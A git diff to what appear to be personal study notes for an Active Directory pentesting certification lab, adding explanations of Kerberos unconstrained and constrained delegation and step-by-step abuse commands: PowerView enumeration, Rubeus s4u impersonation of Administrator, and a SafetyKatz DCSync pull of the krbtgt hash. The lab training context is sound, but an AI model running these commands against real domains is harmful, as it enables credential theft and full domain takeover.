@@ -2086,6 +2086,11 @@ john.exe --wordlist=C"\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes
 you were able to access the dcorp-mgmt device through the svcadmin user because he can execute the MSSQLsvc service in the dcrop-mgmt deivce
 
 # Priv Esc - Unconstrained Delegation
+Some devices contain a feature called UnConstrained Delegation. The idea of this feature is that any user who logs in to the device, whether he has Domain Admin privileges or another, and tries to set up access to a service located in another device via Kerberos, will save his TGT in the memory.
+
+The reason for saving the TGT in the memory is that when another service is requested, we do not need to authenticate the TGT via Kerberos because it was already saved in the memory.
+
+
 ### Discover domain computers that have unconstrained delegation
 Domain Controllers always show up, ignore them
 ```
@@ -2168,6 +2173,34 @@ if you get `"Error Code 1722 -  The RPC server is unavailable"` it is fine
 Rubeus.exe ptt /ticket:<base64TGT of the DC>
 ```
 7. run DCSync attack to get the NTLM hash of the DC
+```
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+```
+
+# Priv Esc - constrained Delegation
+### Enumerate users and computers with constrained delegation enabled
+```
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/445f780d-0f73-4af9-a137-8688575b91a1)
+
+check useraccountcontrol if you have `"TRUSTED_TO_AUTH_FOR_DELEGATION"` means constrained delegation is enabled on this user
+
+if you compromise the account websvc I would be able to access the file system on dcorp-mssql as any user including the domain admin
+### Impersonate the Administrator account to access CIFS
+```
+Rubeus.exe s4u /user:websvc /aes256:<aes256OfWebsvcUser> /impersonateuser:Administrator /msdsspn:CIFS/dorp-mssql.dollarcorp.moneycorp.local /ptt
+Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256OfWebsvcUser> /impersonateuser:Administrator /msdsspn:TIME/dorp-mssql.dollarcorp.moneycorp.local /altservice:ldap /ptt #get the ldap process from the domain admin to run dcsync attack
+klist
+dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+```
+### you can access dcorp-mssql computer as we have the TGS ticket
+```
+Enter-PSSession -ComputerName dcorp-mssql.dollarcorp.moneycorp.LOCAL
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/644bdc64-3267-4737-b465-501d9bb522f2)
+### now you can Perform DCSync attack
 ```
 SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
